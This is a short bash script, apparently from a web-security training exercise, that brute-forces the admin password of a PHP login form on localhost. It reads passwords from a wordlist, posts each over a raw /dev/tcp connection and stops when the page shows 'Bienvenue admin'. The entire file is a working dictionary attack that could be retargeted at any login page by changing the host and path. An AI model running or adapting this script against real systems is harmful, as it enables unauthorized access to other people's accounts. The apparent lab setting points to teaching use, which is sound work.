#!/bin/bash
sendPost() {
  path=$1
  echo  "POST $path HTTP/1.0" >&3
}

send() {
  msg=$1
  echo  $msg >&3
}
connexion() {
exec 3<>/dev/tcp/localhost/80
}

#Main
while read pass
do
  connexion
  echo "Test for $pass..."
  data="login=admin&mp=$pass&submit=connexion"
  size=${#data}

  sendPost "/Formation/BotWeb/login.php"
  send "Content-Length: $size"
  send "Content-Type: application/x-www-form-urlencoded"
  send ""
  send  "$data"

  #Extaire les 50 premières lignes de la réponse.
  response=$(head -n 50 <&3)
  echo $response
  if [[ $response =~ ^.*Bienvenue[[:space:]]admin.*$ ]]
  then
    echo "Bingo: Mot de passe trouvé ($pass)"
    exit
  fi
done < $1

exec 3>&-
